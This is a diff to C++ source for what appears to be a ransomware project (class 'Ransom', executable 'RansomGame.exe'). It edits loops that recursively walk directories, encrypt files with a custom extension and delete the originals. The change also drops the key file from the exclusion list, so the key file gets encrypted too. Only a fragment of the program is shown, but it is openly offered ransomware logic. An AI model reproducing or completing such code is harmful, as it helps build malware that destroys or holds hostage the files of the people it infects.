@@ -1,5 +1,11 @@
 #include "Ransom.h"
 
+inline bool EndOfFile(const CryptoPP::FileSource& file)
+{
+	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
+	return stream->eof();
+}
+
 void Ransom::run_encryption_logic()
 {
 	/*
@@ -13,7 +19,7 @@ void Ransom::run_encryption_logic()
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename() == encryption_file_ || entry.path().filename().extension() == custom_extension_name)
+		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename().extension() == custom_extension_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
 		}
@@ -35,7 +41,7 @@ void Ransom::run_decryption_logic()
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename() == encryption_file_)
+		if (entry.path().filename() == "RansomGame.exe")
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
 		}
@@ -48,12 +54,6 @@ void Ransom::run_decryption_logic()
 			delete_file(const_cast<char*>(entry_name.c_str()));
 		}
 	}
-}
-
-inline bool EndOfFile(const CryptoPP::FileSource& file)
-{
-	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
-	return stream->eof();
 }
 
 void Ransom::encrypt_files(const char* file_name)
